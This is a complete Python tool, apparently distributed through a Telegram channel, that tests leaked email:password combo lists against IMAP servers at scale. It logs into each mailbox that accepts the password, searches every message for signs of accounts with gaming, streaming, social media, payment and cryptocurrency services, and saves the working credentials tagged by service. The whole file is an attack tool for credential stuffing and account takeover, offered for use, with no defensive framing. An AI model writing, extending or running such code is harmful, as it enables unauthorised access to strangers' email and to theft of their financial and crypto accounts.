import os, socket, imaplib, queue, threading, time, sys
from collections import defaultdict

APP_NAME = "ZAL Mail Access Checker + Inboxer"
CHANNEL = "t.me/professor_zal_projects"
OWNER   = "@mr_crkz"
RESULTS_DIR = "Results"
IMAP_TIMEOUT = 15

SERVICES = {
    "PlayStation":  ["playstation", "play station", "psn", "sony"],
    "Steam":        ["steam", "steamcommunity", "valve"],
    "Xbox":         ["xbox", "xbox live"],
    "Nintendo":     ["nintendo", "switch account"],
    "EpicGames":    ["epic games", "epicgames", "fortnite"],
    "Riot":         ["riot games", "league of legends", "valorant"],
    "Roblox":       ["roblox"],
    "Ubisoft":      ["ubisoft", "uplay"],
    "EA":           ["ea games", "electronic arts", "origin"],
    "BattleNet":    ["battlenet", "blizzard"],
    "GOG":          ["gog.com", "gog galaxy"],
    "Netflix":      ["netflix"],
    "Spotify":      ["spotify"],
    "DisneyPlus":   ["disney+"],
    "Hulu":         ["hulu"],
    "HBO":          ["hbo max", "hbo"],
    "PrimeVideo":   ["prime video"],
    "Crunchyroll":  ["crunchyroll"],
    "Discord":      ["discord", "discordapp"],
    "Instagram":    ["instagram"],
    "Facebook":     ["facebook"],
    "TikTok":       ["tiktok"],
    "Twitter":      ["twitter", " x.com"],
    "Snapchat":     ["snapchat"],
    "Reddit":       ["reddit"],
    "Pinterest":    ["pinterest"],
    "LinkedIn":     ["linkedin"],
    "Telegram":     ["telegram"],
    "Amazon":       ["amazon"],
    "eBay":         ["ebay"],
    "AliExpress":   ["aliexpress"],
    "Etsy":         ["etsy"],
    "Walmart":      ["walmart"],
    "PayPal":       ["paypal"],
    "Wise":         ["wise.com", "transferwise"],
    "Revolut":      ["revolut"],
    "Binance":      ["binance"],
    "Coinbase":     ["coinbase"],
    "MetaMask":     ["metamask"],
    "TrustWallet":  ["trust wallet"],
    "Kraken":       ["kraken"],
    "KuCoin":       ["kucoin"],
    "OKX":          ["okx"],
    "NordVPN":      ["nordvpn"],
    "ExpressVPN":   ["expressvpn"],
    "Surfshark":    ["surfshark"],
    "Cloudflare":   ["cloudflare"],
    "Namecheap":    ["namecheap"],
    "GoDaddy":      ["godaddy"],
    "DigitalOcean": ["digitalocean"],
    "Yahoo":        ["yahoo"],
    "Outlook":      ["outlook"],
    "ProtonMail":   ["protonmail"],
    "Zoho":         ["zoho"],
    "Apple":        ["apple id", "appleid", "icloud"],
    "Google":       ["google account", "gmail"],
}

search_word = ""
threads_count = 100
stop_event = threading.Event()
dns_cache = {}
stats_lock = threading.Lock()
write_lock = threading.Lock()
print_lock = threading.Lock()
service_hits = defaultdict(int)
service_order = []
stats = {"checked": 0, "good": 0, "bad": 0, "total": 0, "start_time": None}


def ensure_results():
    os.makedirs(RESULTS_DIR, exist_ok=True)


def detect_imap(domain):
    if domain in dns_cache:
        return dns_cache[domain]
    for h in (f"imap.{domain}", f"mail.{domain}", f"imap-mail.{domain}", domain):
        try:
            socket.gethostbyname(h)
            dns_cache[domain] = h
            return h
        except Exception:
            continue
    fallback = f"imap.{domain}"
    dns_cache[domain] = fallback
    return fallback


def save_line(filename, line):
    with write_lock:
        with open(os.path.join(RESULTS_DIR, filename), "a", encoding="utf-8") as f:
            f.write(line + "\n")


def render():
    with print_lock:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.write("╔══════════════════════════════════════════════╗\n")
        sys.stdout.write(f"║      {APP_NAME:<39}║\n")
        sys.stdout.write(f"║      Channel : {CHANNEL:<29}║\n")
        sys.stdout.write(f"║      Owner   : {OWNER:<29}║\n")
        sys.stdout.write("╚══════════════════════════════════════════════╝\n\n")

        sys.stdout.write("  ── Services Found ────────────────────────────\n")
        if not service_order:
            sys.stdout.write("  (waiting...)\n")
        else:
            for name in service_order:
                sys.stdout.write(f"  {name:<15} → {service_hits[name]}\n")
        sys.stdout.write("\n")

        with stats_lock:
            c = stats["checked"]; g = stats["good"]; b = stats["bad"]
            t = stats["total"]; st = stats["start_time"]
        pct = (c / t * 100) if t else 0.0
        elapsed = time.time() - st if st else 0
        rate = c / elapsed if elapsed > 0 else 0
        eta = int((t - c) / rate) if rate > 0 and c < t else 0
        status = (f"  [{c}/{t}] {pct:5.1f}%  |  GOOD:{g}  BAD:{b}  |  "
                  f"{rate:.0f}/s  |  ETA {eta//3600:02d}:{(eta%3600)//60:02d}:{eta%60:02d}")
        sys.stdout.write(status + "\n")
        sys.stdout.flush()


def match_service(body):
    lower = body.lower()
    best_service = ""
    best_score = 0
    for service, keywords in SERVICES.items():
        score = sum(1 for kw in keywords if kw in lower)
        if score > best_score:
            best_score = score
            best_service = service
    return best_service, best_score


def process_combo(combo):
    if stop_event.is_set():
        return
    try:
        if ":" not in combo:
            with stats_lock:
                stats["checked"] += 1
                stats["bad"] += 1
            return

        email, password = combo.split(":", 1)
        domain = email.split("@")[-1].lower() if "@" in email else ""
        imap_host = detect_imap(domain)

        try:
            mail = imaplib.IMAP4_SSL(imap_host, 993, timeout=IMAP_TIMEOUT)
        except Exception:
            with stats_lock:
                stats["checked"] += 1
                stats["bad"] += 1
            return

        try:
            try:
                mail.login(email, password)
            except Exception:
                with stats_lock:
                    stats["checked"] += 1
                    stats["bad"] += 1
                return

            typ, _ = mail.select("INBOX")
            if typ != "OK":
                with stats_lock:
                    stats["checked"] += 1
                    stats["bad"] += 1
                return

            with stats_lock:
                stats["checked"] += 1
                stats["good"] += 1

            try:
                if search_word:
                    typ, data = mail.search(None, "BODY", f'"{search_word}"')
                else:
                    typ, data = mail.search(None, "ALL")
                ids = data[0].split() if (typ == "OK" and data and data[0]) else []
            except Exception:
                ids = []

            if not ids:
                save_line("Hits.txt", f"{email}:{password}")
                return

            found = set()
            for mid in ids:
                try:
                    typ, msgdata = mail.fetch(mid, "(RFC822)")
                    if typ != "OK" or not msgdata:
                        continue
                    raw = b""
                    for part in msgdata:
                        if isinstance(part, tuple) and part[1]:
                            raw += part[1]
                    if not raw:
                        continue
                    body = raw.decode("utf-8", errors="ignore")
                    service, score = match_service(body)
                    if service and score > 0:
                        found.add(service)
                except Exception:
                    continue

            if not found:
                save_line("Hits.txt", f"{email}:{password}")
                return

            for service in found:
                with stats_lock:
                    service_hits[service] += 1
                    if service not in service_order:
                        service_order.append(service)
                save_line("Good.txt", f"{email}:{password} | service:{service}")
        finally:
            try: mail.logout()
            except Exception: pass

    except Exception:
        with stats_lock:
            stats["checked"] += 1
            stats["bad"] += 1


def worker(jobs):
    while not stop_event.is_set():
        try:
            combo = jobs.get(timeout=0.5)
        except queue.Empty:
            continue
        try:
            process_combo(combo)
        finally:
            jobs.task_done()


def print_banner():
    print("╔══════════════════════════════════════════════╗")
    print(f"║      {APP_NAME:<39}║")
    print(f"║      Channel : {CHANNEL:<29}║")
    print(f"║      Owner   : {OWNER:<29}║")
    print("╚══════════════════════════════════════════════╝")
    print()


def main():
    global search_word, threads_count
    ensure_results()
    print_banner()

    path = input("  txt file path: ").strip().strip('"')
    if not os.path.isfile(path):
        print("  file not found")
        return

    search_word = input("  search word (empty = all): ").strip().lower()

    try:
        threads_count = int(input("  threads: ").strip())
    except Exception:
        threads_count = 100
    if threads_count < 1:
        threads_count = 1

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [ln.strip() for ln in f if ":" in ln and ln.strip()]

    with stats_lock:
        stats["total"] = len(lines)
        stats["start_time"] = time.time()

    jobs = queue.Queue()
    for ln in lines:
        jobs.put(ln)

    for _ in range(threads_count):
        threading.Thread(target=worker, args=(jobs,), daemon=True).start()

    try:
        while True:
            render()
            with stats_lock:
                done = stats["checked"] >= stats["total"]
            if done and jobs.empty():
                break
            time.sleep(0.4)
    except KeyboardInterrupt:
        stop_event.set()
        render()
        print("\n  stopped.")
        return

    render()
    print("\n  done.")


if __name__ == "__main__":
    main()